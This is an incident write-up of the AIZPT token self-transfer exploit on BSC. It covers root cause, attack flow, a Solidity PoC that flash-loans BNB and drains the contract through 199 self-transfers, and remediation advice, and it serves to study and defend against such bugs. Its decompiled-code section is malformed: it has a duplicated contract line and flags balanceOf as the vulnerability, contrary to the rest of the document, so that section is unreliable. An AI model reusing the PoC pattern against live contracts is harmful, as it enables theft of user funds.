# AIZPT Token — Self-Transfer Burn Mechanism Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2024-10-01 |
| **Protocol** | AIZPT Token |
| **Chain** | BSC |
| **Loss** | ~20,000 USD (34.88 BNB) |
| **Attacker** | [0x3026c464](https://bscscan.com/address/0x3026c464d3bd6ef0ced0d49e80f171b58176ce32) |
| **Attack Tx** | [0x5e694707](https://bscscan.com/tx/0x5e694707337cca979d18f9e45f40e81d6ca341ed342f1377f563e779a746460d) |
| **Vulnerable Contract** | [0xBe779D42](https://bscscan.com/address/0xbe779d420b7d573c08eee226b9958737b6218888) |
| **Root Cause** | Transferring AIZPT tokens to the contract itself triggers an internal burn logic that swaps them for BNB |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/AIZPTToken_exp.sol) |

---
## 1. Vulnerability Overview

The AIZPT token contract executes an internal burn and BNB swap logic when tokens are transferred to the contract itself. The attacker borrowed 8,000 BNB via a flash loan from a PancakeV3 pool, swapped BNB for AIZPT, then repeatedly transferred AIZPT back to the contract itself (199 times) to drain the internal BNB reserves.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable AIZPT transfer: self-transfer triggers burn + BNB payout
contract AIZPTToken {
    function _transfer(address from, address to, uint256 amount) internal {
        if (to == address(this)) {
            // ❌ Sending to self pays out internal BNB
            // BNB calculated proportionally to amount (based on price oracle)
            uint256 bnbAmount = _calculateBNB(amount);
            _burn(from, amount);
            payable(from).transfer(bnbAmount);  // BNB payout
        } else {
            // Normal transfer
        }
    }

    // ❌ Repeated calls can fully drain all BNB
}

// ✅ Fix: block self-transfers
// require(to != address(this), "cannot send to self");
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: AIZPTToken_decompiled.sol
contract AIZPTToken {
contract AIZPTToken {
    address public owner;


    // Selector: 0x70a08231
    function balanceOf(address p0) external view returns (uint256) {}  // ❌ Vulnerability

    // Selector: 0xa9059cbb
    function transfer(address p0, uint256 p1) external {}

    // Selector: 0xb3f00674
    function feeReceiver() external {}

    // Selector: 0xd9443923
    function liquidityAdded() external {}

    // Selector: 0xefdcd974
    function setFeeReceiver(address p0) external {}

    // Selector: 0xf275f64b
    function enableTrading(bool p0) external {}

    // Selector: 0xf2fde38b
    // Alternative: _SIMONdotBLACK_(int8[],uint256,address,bytes8,int96)
    function transferOwnership(address p0) external {}

    // Selector: 0x715018a6
    function renounceOwnership() external {}

    // Selector: 0x8da5cb5b
    function owner() external view returns (address) {}

    // Selector: 0x95d89b41
    function symbol() external view returns (string memory) {}

    // Selector: 0x9a540abf
    function addLiquidity(uint32 p0) external {}

    // Selector: 0x1693e8d4
    function tradingEnable() external {}

    // Selector: 0x18160ddd
    function totalSupply() external view returns (uint256) {}

    // Selector: 0x27de2e85
    function extendLiquidityLock(uint32 p0) external {}

    // Selector: 0x313ce567
    function decimals() external view returns (uint8) {}

    // Selector: 0x5b8bec55
    function liquidityProvider() external {}

    // Selector: 0x67b9a286
    function removeLiquidity() external {}

    // Selector: 0x04c0c476
    function blockToUnlockLiquidity() external {}

    // Selector: 0x06fdde03
    function name() external view returns (string memory) {}

    // Selector: 0x0902f1ac
    // Alternative: join_tg_invmru_haha_691357a(bool,bool,bool)
    function getReserves() external view returns (uint256) {}

    // Selector: 0x0de00d0b
    function renounceLiquidityProvider() external {}

    // Selector: 0x11106ee2
    function getAmountOut(uint256 p0, bool p1) external view returns (uint256) {}

    // Selector: 0x4e487b71
    function Panic(uint256 p0) external {}
}
```

## 3. Attack Flow

```
Attacker (AttackerC)
  │
  ├─[1]─▶ PancakeV3Pool flash loan: 8,000 BNB
  │
  ├─[2]─▶ WBNB.withdraw(8,000 ether) — WBNB → BNB
  │
  ├─[3]─▶ AIZPT.call{value: 8000 ether}("") — purchase AIZPT with BNB
  │
  ├─[4]─▶ Loop 199 times:
  │         AIZPT.transfer(AIZPT, 3,837,275 ether)
  │         └─ ❌ Each self-transfer returns BNB
  │             draining BNB from the contract
  │
  ├─[5]─▶ WBNB.deposit{value: balance}() — BNB → WBNB
  │
  └─[6]─▶ Repay flash loan + ~34.88 BNB profit
```

## 4. PoC Code

```solidity
function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
    // Unwrap WBNB → BNB
    IFS(weth).withdraw(8000 ether);

    // Purchase AIZPT with BNB
    AIZPT.call{value: 8000 ether}("");

    // ❌ Drain BNB via 199 self-transfers
    for (uint256 i; i < 199; ++i) {
        IERC20(AIZPT).transfer(AIZPT, 3_837_275 ether);
    }

    // Wrap remaining BNB back to WBNB
    IFS(weth).deposit{value: address(this).balance}();

    // Repay flash loan
    IERC20(weth).transfer(PancakeV3Pool, 8_004_100_000_000_000_000_000);
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Business Logic Vulnerability |
| **Attack Vector** | Self-Transfer Burn Mechanism |
| **CWE** | CWE-682: Incorrect Calculation |
| **DASP** | Business Logic Vulnerability |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Block self-transfers**: `require(to != address(this), "self transfer")`
2. **Separate burn + BNB function**: Allow BNB redemption only through a dedicated `burn()` function
3. **Limit call count**: Restrict the number of burn function invocations within a single transaction
4. **Protect liquidity reserves**: Set a minimum reserve floor on the BNB reserves

## 7. Lessons Learned

- Allowing transfers to a token contract's own address can trigger internal logic in unintended ways.
- A burn + BNB payout mechanism can be fully drained via repeated calls.
- The combination of a flash loan and a repetition loop is the most effective pattern for exploiting such mechanisms.